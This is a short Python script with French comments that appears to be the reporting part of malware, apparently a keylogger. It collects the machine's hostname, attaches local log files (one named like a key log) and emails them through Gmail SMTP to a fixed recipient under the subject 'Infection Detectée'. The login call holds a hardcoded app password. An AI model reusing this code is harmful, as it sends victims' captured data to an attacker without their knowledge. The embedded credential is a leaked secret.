import smtplib
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Récupérer le nom de la machine
hostname = socket.gethostname()

# Configurer l'e-mail
from_email = "votre_email@gmail.com"
to_email = "adresse@destinataire.com"
subject = f"Infection Detectée ({hostname})"  # Ajouter le nom de la machine dans le sujet
body = "Rapport infection"

# Créer l'objet MIME
msg = MIMEMultipart()
msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = subject

# Ajouter le corps du message
msg.attach(MIMEText(body, 'plain'))

# Liste des fichiers à joindre
files_to_attach = ["NBCLE.txt", "logdecle.txt", "LOG.txt"]

# Ajouter les fichiers en pièce jointe
for filename in files_to_attach:
    try:
        attachment = open(filename, "rb")  # Ouvrir le fichier en mode lecture binaire
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
        msg.attach(part)
        attachment.close()  # Fermer le fichier après l'ajout
    except Exception as e:
        print(f"Erreur lors de l'ajout du fichier {filename}: {e}")

# Configuration du serveur SMTP
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()  # Sécuriser la connexion
server.login(from_email, 'gzdd ejec tmxw zqdx')
text = msg.as_string()

# Envoi de l'e-mail
try:
    server.sendmail(from_email, to_email, text)
    print("E-mail envoyé avec succès.")
except Exception as e:
    print(f"Erreur lors de l'envoi de l'e-mail: {e}")
finally:
    server.quit()  # Fermer la connexion SMTP
